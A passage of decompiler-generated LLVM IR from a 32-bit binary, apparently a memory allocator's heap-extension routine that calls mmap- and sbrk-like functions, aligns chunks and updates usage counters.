  %v5_8052e86 = sub i32 %v1_8052e81, %v1_8052f78
  store i32 %v5_8052e86, i32* %esi.global-to-local, align 4
  store i32 %v3_8052e7e, i32* %v2_8052e60, align 4
  %v0_8052e8d = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052e8d = load i32, i32* %eax.global-to-local, align 4
  %v2_8052e8d = add i32 %v1_8052e8d, 8
  %v3_8052e8d = inttoptr i32 %v2_8052e8d to i32*
  store i32 %v0_8052e8d, i32* %v3_8052e8d, align 4
  %v0_8052e90 = load i32, i32* %esi.global-to-local, align 4
  %tmp127 = icmp ult i32 %v0_8052e90, 16
  br i1 %tmp127, label %dec_label_pc_8052e95, label %dec_label_pc_8052e9c

dec_label_pc_8052e95:                             ; preds = %dec_label_pc_8052e7b
  %v0_8052e95 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8052e95 = load i32, i32* @edx, align 4
  %v2_8052e95 = add i32 %v0_8052e95, 4
  %v3_8052e95 = add i32 %v2_8052e95, %v1_8052e95
  %v4_8052e95 = inttoptr i32 %v3_8052e95 to i32*
  %v5_8052e95 = load i32, i32* %v4_8052e95, align 4
  %v6_8052e95 = or i32 %v5_8052e95, 1
  store i32 %v6_8052e95, i32* %v4_8052e95, align 4
  br label %dec_label_pc_8052edb

dec_label_pc_8052e9c:                             ; preds = %dec_label_pc_8052e7b
  store i32 %v1_8052f78, i32* %eax.global-to-local, align 4
  %v0_8052ea5 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8052ea5 = add i32 %v0_8052ea5, %v1_8052f78
  store i32 %v2_8052ea5, i32* @edx, align 4
  %v1_8052ea8 = load i32, i32* @ebp, align 4
  %v2_8052ea8 = add i32 %v1_8052ea8, 8
  %v3_8052ea8 = inttoptr i32 %v2_8052ea8 to i32*
  store i32 %v2_8052ea5, i32* %v3_8052ea8, align 4
  %v0_8052eab = load i32, i32* @edx, align 4
  %v1_8052eab = load i32, i32* @ebp, align 4
  %v2_8052eab = add i32 %v1_8052eab, 12
  %v3_8052eab = inttoptr i32 %v2_8052eab to i32*
  store i32 %v0_8052eab, i32* %v3_8052eab, align 4
  %v0_8052eae = load i32, i32* @edx, align 4
  %v1_8052eae = add i32 %v0_8052eae, 8
  %v2_8052eae = inttoptr i32 %v1_8052eae to i32*
  store i32 ptrtoint (i32* @global_var_8056bf4.209 to i32), i32* %v2_8052eae, align 4
  %v0_8052eb5 = load i32, i32* @edx, align 4
  %v1_8052eb5 = add i32 %v0_8052eb5, 12
  %v2_8052eb5 = inttoptr i32 %v1_8052eb5 to i32*
  store i32 ptrtoint (i32* @global_var_8056bf4.209 to i32), i32* %v2_8052eb5, align 4
  br i1 %v6_8052c31, label %dec_label_pc_8052ec4, label %dec_label_pc_8052ebe

dec_label_pc_8052ebe:                             ; preds = %dec_label_pc_8052e9c
  %v0_8052ebe = load i32, i32* @edx, align 4
  store i32 %v0_8052ebe, i32* @global_var_8056bf0.208, align 16
  br label %dec_label_pc_8052ec4

dec_label_pc_8052ec4:                             ; preds = %dec_label_pc_8052e9c, %dec_label_pc_8052ebe
  %v4_8052ec4 = or i32 %v1_8052f78, 1
  %v0_8052ec9 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v4_8052ec4, i32* %ebx.global-to-local, align 4
  %v1_8052ecf = or i32 %v0_8052ec9, 1
  store i32 %v1_8052ecf, i32* %eax.global-to-local, align 4
  %v1_8052ed2 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8052ed2 = add i32 %v1_8052ed2, 4
  %v3_8052ed2 = inttoptr i32 %v2_8052ed2 to i32*
  store i32 %v4_8052ec4, i32* %v3_8052ed2, align 4
  %v0_8052ed5 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052ed5 = load i32, i32* @edx, align 4
  %v3_8052ed5 = add i32 %v1_8052ed5, %v0_8052ed5
  %v4_8052ed5 = inttoptr i32 %v3_8052ed5 to i32*
  store i32 %v0_8052ed5, i32* %v4_8052ed5, align 4
  %v0_8052ed8 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052ed8 = load i32, i32* @edx, align 4
  %v2_8052ed8 = add i32 %v1_8052ed8, 4
  %v3_8052ed8 = inttoptr i32 %v2_8052ed8 to i32*
  store i32 %v0_8052ed8, i32* %v3_8052ed8, align 4
  br label %dec_label_pc_8052edb

dec_label_pc_8052edb:                             ; preds = %dec_label_pc_8052e95, %dec_label_pc_8052ec4
  %v0_8052edb = load i32, i32* %ecx.global-to-local, align 4
  %v1_8052edb = add i32 %v0_8052edb, 8
  store i32 %v1_8052edb, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80532dd

dec_label_pc_8052ee3.loopexit:                    ; preds = %dec_label_pc_8052e30
  br label %dec_label_pc_8052ee3

dec_label_pc_8052ee3:                             ; preds = %dec_label_pc_8052ee3.loopexit, %dec_label_pc_8052beb, %dec_label_pc_8052bf3
  %v0_8052ee3 = load i32, i32* @global_var_8056bec.207, align 4
  store i32 %v0_8052ee3, i32* @ebx, align 4
  %v1_8052eed = add i32 %v1_8052f78, 16
  store i32 %v1_8052eed, i32* @esi, align 4
  %v1_8052ef0 = add i32 %v0_8052ee3, 4
  %v2_8052ef0 = inttoptr i32 %v1_8052ef0 to i32*
  %v3_8052ef0 = load i32, i32* %v2_8052ef0, align 4
  %v1_8052ef7 = and i32 %v3_8052ef0, -4
  store i32 %v1_8052ef7, i32* %ecx.global-to-local, align 4
  %v7_8052efa = icmp ult i32 %v1_8052ef7, %v1_8052eed
  br i1 %v7_8052efa, label %dec_label_pc_8052f1a, label %dec_label_pc_8052efe

dec_label_pc_8052efe:                             ; preds = %dec_label_pc_8052ee3
  %v2_8052f02 = add i32 %v0_8052ee3, %v1_8052f78
  store i32 %v2_8052f02, i32* @edx, align 4
  %v1_8052f05 = or i32 %v1_8052f78, 1
  store i32 %v1_8052f05, i32* %eax.global-to-local, align 4
  store i32 %v2_8052f02, i32* @global_var_8056bec.207, align 4
  store i32 %v1_8052f05, i32* %v2_8052ef0, align 4
  %v0_8052f11 = load i32, i32* %ecx.global-to-local, align 4
  %v5_8052f11 = sub i32 %v0_8052f11, %v1_8052f78
  store i32 %v5_8052f11, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805326d

dec_label_pc_8052f1a:                             ; preds = %dec_label_pc_8052ee3
  %v0_8052f1a = load i32, i32* @global_var_8056f1c.212, align 4
  store i32 %v0_8052f1a, i32* %edx.global-to-local, align 4
  %v0_8052f20 = load i8, i8* @global_var_8056bc0.206, align 64
  %v1_8052f20 = and i8 %v0_8052f20, 2
  %v2_8052f20 = icmp eq i8 %v1_8052f20, 0
  br i1 %v2_8052f20, label %dec_label_pc_8052f4e, label %dec_label_pc_8052f29

dec_label_pc_8052f29:                             ; preds = %dec_label_pc_8052f1a
  store i32 ptrtoint (i8* @global_var_8056bc0.206 to i32), i32* %stack_var_-92, align 4
  %v2_8052f31 = call i32 @function_80537a1(i32* bitcast (i8* @global_var_8056bc0.206 to i32*))
  store i32 ptrtoint (i8* @global_var_8056bc0.206 to i32), i32* @ebx, align 4
  %v1_8052f3b = add i32 %v1_8052f78, -7
  store i32 %v1_8052f3b, i32* %eax.global-to-local, align 4
  store i32 %v1_8052f3b, i32* %stack_var_-92, align 4
  %v1_8052f3f = call i32 @function_8052b84(i32 %v1_8052f3b)
  store i32 %v1_8052f3f, i32* %eax.global-to-local, align 4
  store i32 %v1_8052f3f, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80532dd

dec_label_pc_8052f4e:                             ; preds = %dec_label_pc_8052f1a
  %v1_8052f4e = add i32 %v0_8052f1a, -1
  store i32 %v1_8052f4e, i32* @ecx, align 4
  store i32 %v1_8052f78, i32* @ebx, align 4
  %v1_8052f59 = load i32, i32* @global_var_8056f0c.213, align 4
  %v7_8052f59 = icmp ult i32 %v1_8052f78, %v1_8052f59
  br i1 %v7_8052f59, label %dec_label_pc_805301b, label %dec_label_pc_8052f65

dec_label_pc_8052f65:                             ; preds = %dec_label_pc_8052f4e
  %v0_8052f65 = load i32, i32* @global_var_8056f10.214, align 16
  store i32 %v0_8052f65, i32* %eax.global-to-local, align 4
  %v1_8052f6a = load i32, i32* @global_var_8056f14.215, align 4
  %v5_8052f70 = icmp slt i32 %v0_8052f65, %v1_8052f6a
  br i1 %v5_8052f70, label %dec_label_pc_8052f76, label %dec_label_pc_805301b

dec_label_pc_8052f76:                             ; preds = %dec_label_pc_8052f65
  %v2_8052f78 = add i32 %v1_8052f78, 10
  %v3_8052f78 = add i32 %v2_8052f78, %v0_8052f1a
  %v1_8052f7c = sub i32 0, %v0_8052f1a
  store i32 %v1_8052f7c, i32* %eax.global-to-local, align 4
  %v2_8052f7e = and i32 %v3_8052f78, %v1_8052f7c
  store i32 %v2_8052f7e, i32* @ebx, align 4
  %tmp128 = icmp ugt i32 %v2_8052f7e, %v1_8052f78
  br i1 %tmp128, label %dec_label_pc_8052f8a, label %dec_label_pc_805301b

dec_label_pc_8052f8a:                             ; preds = %dec_label_pc_8052f76
  store i32 0, i32* %stack_var_-92, align 4
  %v8_8052f97 = call i32 @function_80543c8(i32 0, i32 %v2_8052f7e, i32 3, i32 34, i32 0, i32 0, i32 %v1_8052f4e, i32 %v1_8052f4e)
  store i32 %v8_8052f97, i32* %eax.global-to-local, align 4
  store i32 %v8_8052f97, i32* @edx, align 4
  %v10_8052fa1 = icmp eq i32 %v8_8052f97, -1
  br i1 %v10_8052fa1, label %dec_label_pc_8052f8a.dec_label_pc_805301b_crit_edge, label %dec_label_pc_8052fa6

dec_label_pc_8052f8a.dec_label_pc_805301b_crit_edge: ; preds = %dec_label_pc_8052f8a
  %v0_805301b.pre = load i32, i32* @global_var_8056bec.207, align 4
  br label %dec_label_pc_805301b

dec_label_pc_8052fa6:                             ; preds = %dec_label_pc_8052f8a
  %v1_8052fa8 = urem i32 %v8_8052f97, 8
  %v2_8052fa8 = icmp eq i32 %v1_8052fa8, 0
  store i32 %v1_8052fa8, i32* %ecx.global-to-local, align 4
  br i1 %v2_8052fa8, label %dec_label_pc_8052fc0, label %dec_label_pc_8052fad

dec_label_pc_8052fad:                             ; preds = %dec_label_pc_8052fa6
  %v0_8052fb2 = load i32, i32* @ebx, align 4
  %v2_8052fb4 = sub nsw i32 8, %v1_8052fa8
  store i32 %v2_8052fb4, i32* %eax.global-to-local, align 4
  %v2_8052fb6 = add i32 %v2_8052fb4, %v8_8052f97
  store i32 %v2_8052fb6, i32* @edx, align 4
  %v2_8052fb8 = sub i32 %v0_8052fb2, %v2_8052fb4
  store i32 %v2_8052fb8, i32* %esi.global-to-local, align 4
  %v2_8052fba = inttoptr i32 %v2_8052fb6 to i32*
  store i32 %v2_8052fb4, i32* %v2_8052fba, align 4
  br label %dec_label_pc_8052fc8

dec_label_pc_8052fc0:                             ; preds = %dec_label_pc_8052fa6
  %v1_8052fc0 = inttoptr i32 %v8_8052f97 to i32*
  store i32 0, i32* %v1_8052fc0, align 4
  br label %dec_label_pc_8052fc8

dec_label_pc_8052fc8:                             ; preds = %dec_label_pc_8052fad, %dec_label_pc_8052fc0
  %storemerge.in = phi i32* [ @esi, %dec_label_pc_8052fad ], [ @ebx, %dec_label_pc_8052fc0 ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_8052fc8 = or i32 %storemerge, 2
  %v1_8052fcb = load i32, i32* @edx, align 4
  %v2_8052fcb = add i32 %v1_8052fcb, 4
  %v3_8052fcb = inttoptr i32 %v2_8052fcb to i32*
  store i32 %v1_8052fc8, i32* %v3_8052fcb, align 4
  %v0_8052fce = load i32, i32* @global_var_8056f10.214, align 16
  %v1_8052fd3 = add i32 %v0_8052fce, 1
  store i32 %v1_8052fd3, i32* %eax.global-to-local, align 4
  store i32 %v1_8052fd3, i32* @global_var_8056f10.214, align 16
  %v1_8052fd9 = load i32, i32* @global_var_8056f18.216, align 8
  %v7_8052fdf = icmp sgt i32 %v1_8052fd3, %v1_8052fd9
  br i1 %v7_8052fdf, label %dec_label_pc_8052fe1, label %dec_label_pc_8052fe6

dec_label_pc_8052fe1:                             ; preds = %dec_label_pc_8052fc8
  store i32 %v1_8052fd3, i32* @global_var_8056f18.216, align 8
  br label %dec_label_pc_8052fe6

dec_label_pc_8052fe6:                             ; preds = %dec_label_pc_8052fc8, %dec_label_pc_8052fe1
  %v0_8052fe6 = load i32, i32* @global_var_8056f24.217, align 4
  %v1_8052feb = load i32, i32* @ebx, align 4
  %v2_8052feb = add i32 %v1_8052feb, %v0_8052fe6
  store i32 %v2_8052feb, i32* %eax.global-to-local, align 4
  store i32 %v2_8052feb, i32* @global_var_8056f24.217, align 4
  %v1_8052ff2 = load i32, i32* @global_var_8056f30.218, align 16
  %tmp129 = icmp ugt i32 %v2_8052feb, %v1_8052ff2
  br i1 %tmp129, label %dec_label_pc_8052ffa, label %dec_label_pc_8052fff

dec_label_pc_8052ffa:                             ; preds = %dec_label_pc_8052fe6
  store i32 %v2_8052feb, i32* @global_var_8056f30.218, align 16
  br label %dec_label_pc_8052fff

dec_label_pc_8052fff:                             ; preds = %dec_label_pc_8052fe6, %dec_label_pc_8052ffa
  %v1_8052fff = load i32, i32* @global_var_8056f28.219, align 8
  %v2_8052fff = add i32 %v1_8052fff, %v2_8052feb
  store i32 %v2_8052fff, i32* %eax.global-to-local, align 4
  %v1_8053005 = load i32, i32* @global_var_8056f34.220, align 4
  %tmp130 = icmp ugt i32 %v2_8052fff, %v1_8053005
  br i1 %tmp130, label %dec_label_pc_8053011, label %dec_label_pc_8052c62

dec_label_pc_8053011:                             ; preds = %dec_label_pc_8052fff
  store i32 %v2_8052fff, i32* @global_var_8056f34.220, align 4
  br label %dec_label_pc_8052c62

dec_label_pc_805301b:                             ; preds = %dec_label_pc_8052f76, %dec_label_pc_8052f8a.dec_label_pc_805301b_crit_edge, %dec_label_pc_8052f65, %dec_label_pc_8052f4e
  %v0_805301b = phi i32 [ %v0_805301b.pre, %dec_label_pc_8052f8a.dec_label_pc_805301b_crit_edge ], [ %v0_8052ee3, %dec_label_pc_8052f65 ], [ %v0_8052ee3, %dec_label_pc_8052f76 ], [ %v0_8052ee3, %dec_label_pc_8052f4e ]
  store i32 %v0_805301b, i32* %eax.global-to-local, align 4
  %v1_8053024 = add i32 %v0_805301b, 4
  %v2_8053024 = inttoptr i32 %v1_8053024 to i32*
  %v3_8053024 = load i32, i32* %v2_8053024, align 4
  %v1_805302e = and i32 %v3_8053024, -4
  %v2_805302e = icmp eq i32 %v1_805302e, 0
  store i32 %v1_805302e, i32* @ebp, align 4
  %v1_8053031 = load i32, i32* @global_var_8056f08.221, align 8
  %v2_8053031 = add i32 %v1_8053031, %v1_8052eed
  store i32 %v2_8053031, i32* %eax.global-to-local, align 4
  %v0_8053037 = load i8, i8* @global_var_8056f20.222, align 32
  %v1_8053037 = urem i8 %v0_8053037, 2
  %v2_8053037 = icmp eq i8 %v1_8053037, 0
  br i1 %v2_8053037, label %dec_label_pc_8053042, label %dec_label_pc_8053040

dec_label_pc_8053040:                             ; preds = %dec_label_pc_805301b
  %v2_8053040 = sub i32 %v2_8053031, %v1_805302e
  store i32 %v2_8053040, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053042

dec_label_pc_8053042:                             ; preds = %dec_label_pc_805301b, %dec_label_pc_8053040
  %v0_8053046 = phi i32 [ %v2_8053031, %dec_label_pc_805301b ], [ %v2_8053040, %dec_label_pc_8053040 ]
  %v5_8053046 = add i32 %v0_8053046, %v1_8052f4e
  store i32 %v5_8053046, i32* %eax.global-to-local, align 4
  %v1_805304a = sub i32 0, %v0_8052f1a
  store i32 %v1_805304a, i32* @edx, align 4
  %v2_8053052 = and i32 %v5_8053046, %v1_805304a
  store i32 %v2_8053052, i32* @esi, align 4
  %tmp91 = icmp slt i32 %v2_8053052, 1
  br i1 %tmp91, label %dec_label_pc_805306c, label %dec_label_pc_8053056

dec_label_pc_8053056:                             ; preds = %dec_label_pc_8053042
  store i32 %v2_8053052, i32* %stack_var_-92, align 4
  %v1_805305a = call i32 @function_8054879(i32 %v2_8053052)
  store i32 %v1_805305a, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
  store i32 %v1_805305a, i32* @ebx, align 4
  %v10_8053067 = icmp eq i32 %v1_805305a, -1
  %v1_805306a = icmp eq i1 %v10_8053067, false
  br i1 %v1_805306a, label %dec_label_pc_80530c2.dec_label_pc_80530cb_crit_edge, label %dec_label_pc_8053056.dec_label_pc_805306c_crit_edge

dec_label_pc_8053056.dec_label_pc_805306c_crit_edge: ; preds = %dec_label_pc_8053056
  %v0_805306c.pre = load i8, i8* @global_var_8056f20.222, align 32
  br label %dec_label_pc_805306c

dec_label_pc_805306c:                             ; preds = %dec_label_pc_8053056.dec_label_pc_805306c_crit_edge, %dec_label_pc_8053042
  %v0_8053098 = phi i32 [ -1, %dec_label_pc_8053056.dec_label_pc_805306c_crit_edge ], [ %v1_805304a, %dec_label_pc_8053042 ]
  %v0_805306c = phi i8 [ %v0_805306c.pre, %dec_label_pc_8053056.dec_label_pc_805306c_crit_edge ], [ %v0_8053037, %dec_label_pc_8053042 ]
  %v1_805306c = urem i8 %v0_805306c, 2
  %v2_805306c = icmp eq i8 %v1_805306c, 0
  br i1 %v2_805306c, label %dec_label_pc_805306c.dec_label_pc_8053081_crit_edge, label %dec_label_pc_8053075

dec_label_pc_805306c.dec_label_pc_8053081_crit_edge: ; preds = %dec_label_pc_805306c
  %v0_8053081.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8053081

dec_label_pc_8053075:                             ; preds = %dec_label_pc_805306c
  %v2_8053079 = add i32 %v1_805302e, %v1_8052f4e
  store i32 %v2_8053079, i32* %eax.global-to-local, align 4
  %v0_805307b = load i32, i32* @esi, align 4
  %v2_805307b = add i32 %v0_805307b, %v2_8053079
  %v5_805307d = and i32 %v2_805307b, %v1_805304a
  store i32 %v5_805307d, i32* @esi, align 4
  br label %dec_label_pc_8053081

dec_label_pc_8053081:                             ; preds = %dec_label_pc_805306c.dec_label_pc_8053081_crit_edge, %dec_label_pc_8053075
  %v0_8053081 = phi i32 [ %v0_8053081.pre, %dec_label_pc_805306c.dec_label_pc_8053081_crit_edge ], [ %v5_805307d, %dec_label_pc_8053075 ]
  %tmp131 = icmp ult i32 %v0_8053081, 1048576
  br i1 %tmp131, label %dec_label_pc_8053089, label %dec_label_pc_805308e

dec_label_pc_8053089:                             ; preds = %dec_label_pc_8053081
  store i32 1048576, i32* @esi, align 4
  br label %dec_label_pc_805308e

dec_label_pc_805308e:                             ; preds = %dec_label_pc_8053081, %dec_label_pc_8053089
  %v0_80530a2 = phi i32 [ %v0_8053081, %dec_label_pc_8053081 ], [ 1048576, %dec_label_pc_8053089 ]
  %tmp132 = icmp ugt i32 %v0_80530a2, %v1_8052f78
  br i1 %tmp132, label %dec_label_pc_8053098, label %dec_label_pc_80532d0

dec_label_pc_8053098:                             ; preds = %dec_label_pc_805308e
  store i32 0, i32* %stack_var_-92, align 4
  %v8_80530a5 = call i32 @function_80543c8(i32 0, i32 %v0_80530a2, i32 3, i32 34, i32 0, i32 0, i32 %v0_8053098, i32 %v0_8053098)
  store i32 %v8_80530a5, i32* %eax.global-to-local, align 4
  store i32 %v8_80530a5, i32* @ebx, align 4
  %v10_80530af = icmp eq i32 %v8_80530a5, -1
  br i1 %v10_80530af, label %dec_label_pc_80532d0, label %dec_label_pc_80530c2.thread

dec_label_pc_80530c2.thread:                      ; preds = %dec_label_pc_8053098
  %v0_80530b8 = load i8, i8* @global_var_8056f20.222, align 1
  %v2_80530b8 = and i8 %v0_80530b8, -2
  store i8 %v2_80530b8, i8* @global_var_8056f20.222, align 32
  %v1_80530bf = load i32, i32* @esi, align 4
  %v2_80530bf = add i32 %v1_80530bf, %v8_80530a5
  store i32 %v2_80530bf, i32* @edx, align 4
  br label %dec_label_pc_80530cb

dec_label_pc_80530c2.dec_label_pc_80530cb_crit_edge: ; preds = %dec_label_pc_8053056
  %v1_80530cf.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80530cb

dec_label_pc_80530cb:                             ; preds = %dec_label_pc_80530c2.dec_label_pc_80530cb_crit_edge, %dec_label_pc_80530c2.thread
  %v1_80530cf = phi i32 [ %v1_80530bf, %dec_label_pc_80530c2.thread ], [ %v1_80530cf.pre, %dec_label_pc_80530c2.dec_label_pc_80530cb_crit_edge ]
  %v0_805319794 = phi i32 [ %v8_80530a5, %dec_label_pc_80530c2.thread ], [ %v1_805305a, %dec_label_pc_80530c2.dec_label_pc_80530cb_crit_edge ]
  %v0_805318993 = phi i32 [ %v2_80530bf, %dec_label_pc_80530c2.thread ], [ -1, %dec_label_pc_80530c2.dec_label_pc_80530cb_crit_edge ]
  %v0_80530cf = load i32, i32* @global_var_8056f28.219, align 8
  %v2_80530cf = add i32 %v1_80530cf, %v0_80530cf
  store i32 %v2_80530cf, i32* @global_var_8056f28.219, align 8
  %v2_80530d5 = add i32 %v1_805302e, %v0_805301b
  store i32 %v2_80530d5, i32* %ecx.global-to-local, align 4
  %v2_80530d7 = sub i32 %v0_805319794, %v2_80530d5
  %v7_80530d7 = icmp ult i32 %v0_805319794, %v2_80530d5
  %v12_80530d7 = icmp eq i32 %v2_80530d7, 0
  %v1_80530d9 = icmp eq i1 %v12_80530d7, false
  br i1 %v1_80530d9, label %dec_label_pc_80530f2, label %dec_label_pc_80530db

dec_label_pc_80530db:                             ; preds = %dec_label_pc_80530cb
  %v10_80530db = icmp eq i32 %v0_805318993, -1
  %v1_80530de = icmp eq i1 %v10_80530db, false
  br i1 %v1_80530de, label %dec_label_pc_80530f2, label %dec_label_pc_80530e0

dec_label_pc_80530e0:                             ; preds = %dec_label_pc_80530db
  %v2_80530e0 = add i32 %v1_80530cf, %v1_805302e
  store i32 %v0_805301b, i32* %ecx.global-to-local, align 4
  %v1_80530e7 = or i32 %v2_80530e0, 1
  store i32 %v1_80530e7, i32* %eax.global-to-local, align 4
  store i32 %v1_80530e7, i32* %v2_8053024, align 4
  br label %dec_label_pc_805321f

dec_label_pc_80530f2:                             ; preds = %dec_label_pc_80530db, %dec_label_pc_80530cb
  %v0_80530f2 = load i8, i8* @global_var_8056f20.222, align 1
  %v1_80530f2 = sext i8 %v0_80530f2 to i32
  store i32 %v1_80530f2, i32* %eax.global-to-local, align 4
  %v2_80530f7 = urem i8 %v0_80530f2, 2
  %v3_80530f7 = icmp eq i8 %v2_80530f7, 0
  br i1 %v3_80530f7, label %dec_label_pc_805310b, label %dec_label_pc_80530fb

dec_label_pc_80530fb:                             ; preds = %dec_label_pc_80530f2
  br i1 %v2_805302e, label %dec_label_pc_805310b, label %dec_label_pc_80530ff

dec_label_pc_80530ff:                             ; preds = %dec_label_pc_80530fb
  %v1_8053101 = icmp eq i1 %v7_80530d7, false
  br i1 %v1_8053101, label %dec_label_pc_805310b, label %dec_label_pc_8053103

dec_label_pc_8053103:                             ; preds = %dec_label_pc_80530ff
  %v1_8053103 = and i32 %v1_80530f2, -2
  %v4_8053103 = trunc i32 %v1_8053103 to i8
  store i32 %v1_8053103, i32* %eax.global-to-local, align 4
  store i8 %v4_8053103, i8* @global_var_8056f20.222, align 32
  br label %dec_label_pc_805310b

dec_label_pc_805310b:                             ; preds = %dec_label_pc_80530ff, %dec_label_pc_80530fb, %dec_label_pc_80530f2, %dec_label_pc_8053103
  %v0_805310b = phi i8 [ %v0_80530f2, %dec_label_pc_80530ff ], [ %v0_80530f2, %dec_label_pc_80530fb ], [ %v0_80530f2, %dec_label_pc_80530f2 ], [ %v4_8053103, %dec_label_pc_8053103 ]
  %v1_805310b = urem i8 %v0_805310b, 2
  %v2_805310b = icmp eq i8 %v1_805310b, 0
  br i1 %v2_805310b, label %dec_label_pc_8053189, label %dec_label_pc_8053114

dec_label_pc_8053114:                             ; preds = %dec_label_pc_805310b
  br i1 %v2_805302e, label %dec_label_pc_8053122, label %dec_label_pc_8053118

dec_label_pc_8053118:                             ; preds = %dec_label_pc_8053114
  store i32 %v2_80530d7, i32* %eax.global-to-local, align 4
  %v2_805311c = add i32 %v2_80530cf, %v2_80530d7
  store i32 %v2_805311c, i32* @global_var_8056f28.219, align 8
  br label %dec_label_pc_8053122

dec_label_pc_8053122:                             ; preds = %dec_label_pc_8053114, %dec_label_pc_8053118
  %v1_8053124 = urem i32 %v0_805319794, 8
  %v2_8053124 = icmp eq i32 %v1_8053124, 0
  store i32 %v1_8053124, i32* %edx.global-to-local, align 4
  %v1_8053127 = icmp eq i1 %v2_8053124, false
  br i1 %v1_8053127, label %dec_label_pc_805312f, label %dec_label_pc_8053129

dec_label_pc_8053129:                             ; preds = %dec_label_pc_8053122
  store i32 %v0_805319794, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053139

dec_label_pc_805312f:                             ; preds = %dec_label_pc_8053122
  %v2_8053134 = sub nsw i32 8, %v1_8053124
  store i32 %v2_8053134, i32* %eax.global-to-local, align 4
  %v2_8053136 = add i32 %v2_8053134, %v0_805319794
  store i32 %v2_8053136, i32* @edi, align 4
  br label %dec_label_pc_8053139

dec_label_pc_8053139:                             ; preds = %dec_label_pc_8053129, %dec_label_pc_805312f
  %v0_805313c = phi i32 [ 0, %dec_label_pc_8053129 ], [ %v2_8053134, %dec_label_pc_805312f ]
  %v2_8053139 = add i32 %v1_80530cf, %v0_805319794
  %v2_805313c = add i32 %v0_805313c, %v1_805302e
  store i32 %v2_805313c, i32* %ecx.global-to-local, align 4
  %v2_8053145 = add i32 %v2_805313c, %v2_8053139
  store i32 %v2_8053145, i32* %edx.global-to-local, align 4
  %v2_805314b = add i32 %v2_8053145, %v1_8052f4e
  %v5_805314e = and i32 %v2_805314b, %v1_805304a
  %v2_8053155 = sub i32 %v5_805314e, %v2_8053145
  store i32 %v2_8053155, i32* %eax.global-to-local, align 4
  %v2_8053157 = add i32 %v2_8053155, %v2_805313c
  store i32 %v2_8053157, i32* @esi, align 4
  store i32 %v2_8053157, i32* %stack_var_-92, align 4
  %v1_805315b = call i32 @function_8054879(i32 %v2_8053157)
  store i32 %v1_805315b, i32* %eax.global-to-local, align 4
  store i32 %v1_805315b, i32* @edx, align 4
  %v10_8053165 = icmp eq i32 %v1_805315b, -1
  %v1_8053168 = icmp eq i1 %v10_8053165, false
  br i1 %v1_8053168, label %dec_label_pc_8053178, label %dec_label_pc_805316a

dec_label_pc_805316a:                             ; preds = %dec_label_pc_8053139
  store i32 0, i32* %stack_var_-92, align 4
  %v1_805316f = call i32 @function_8054879(i32 0)
  store i32 %v1_805316f, i32* %eax.global-to-local, align 4
  store i32 %v1_805316f, i32* @edx, align 4
  br label %dec_label_pc_80531ac

dec_label_pc_8053178:                             ; preds = %dec_label_pc_8053139
  %v1_8053178 = load i32, i32* @ebx, align 4
  %v7_8053178 = icmp ult i32 %v1_805315b, %v1_8053178
  %v1_805317a = icmp eq i1 %v7_8053178, false
  br i1 %v1_805317a, label %dec_label_pc_80531b1, label %dec_label_pc_805317c

dec_label_pc_805317c:                             ; preds = %dec_label_pc_8053178
  %v0_805317c = load i8, i8* @global_var_8056f20.222, align 1
  %v2_805317c = and i8 %v0_805317c, -2
  store i8 %v2_805317c, i8* @global_var_8056f20.222, align 32
  store i32 %v2_8053139, i32* @edx, align 4
  br label %dec_label_pc_8053190

dec_label_pc_8053189:                             ; preds = %dec_label_pc_805310b
  %v10_8053189 = icmp eq i32 %v0_805318993, -1
  br i1 %v10_8053189, label %dec_label_pc_8053194, label %dec_label_pc_805318e

dec_label_pc_805318e:                             ; preds = %dec_label_pc_8053189
  store i32 %v0_805319794, i32* @edi, align 4
  br label %dec_label_pc_8053190

dec_label_pc_8053190:                             ; preds = %dec_label_pc_805317c, %dec_label_pc_805318e
  %v0_80531b158 = phi i32 [ %v2_8053139, %dec_label_pc_805317c ], [ %v0_805318993, %dec_label_pc_805318e ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_80531b1

dec_label_pc_8053194:                             ; preds = %dec_label_pc_8053189
  store i32 %v0_805319794, i32* @edi, align 4
  store i32 0, i32* %stack_var_-92, align 4
  %v1_805319b = call i32 @function_8054879(i32 0)
  store i32 %v1_805319b, i32* @edx, align 4
  %v1_80531a2 = load i32, i32* @ebx, align 4
  %v2_80531a2 = sub i32 %v1_805319b, %v1_80531a2
  %v1_80531a4 = load i32, i32* @esi, align 4
  %v2_80531a4 = sub i32 %v2_80531a2, %v1_80531a4
  store i32 %v2_80531a4, i32* %eax.global-to-local, align 4
  %v0_80531a6 = load i32, i32* @global_var_8056f28.219, align 8
  %v2_80531a6 = add i32 %v0_80531a6, %v2_80531a4
  store i32 %v2_80531a6, i32* @global_var_8056f28.219, align 8
  br label %dec_label_pc_80531ac

dec_label_pc_80531ac:                             ; preds = %dec_label_pc_805316a, %dec_label_pc_8053194
  %v0_80531b157 = phi i32 [ %v1_805316f, %dec_label_pc_805316a ], [ %v1_805319b, %dec_label_pc_8053194 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_80531b1

dec_label_pc_80531b1:                             ; preds = %dec_label_pc_8053178, %dec_label_pc_8053190, %dec_label_pc_80531ac
  %v0_80531b6 = phi i32 [ %v1_805315b, %dec_label_pc_8053178 ], [ %v0_80531b158, %dec_label_pc_8053190 ], [ %v0_80531b157, %dec_label_pc_80531ac ]
  %v10_80531b1 = icmp eq i32 %v0_80531b6, -1
  br i1 %v10_80531b1, label %dec_label_pc_805321f, label %dec_label_pc_80531b6

dec_label_pc_80531b6:                             ; preds = %dec_label_pc_80531b1
  %v1_80531b6 = load i32, i32* @edi, align 4
  %v2_80531b6 = sub i32 %v0_80531b6, %v1_80531b6
  store i32 %v2_80531b6, i32* @edx, align 4
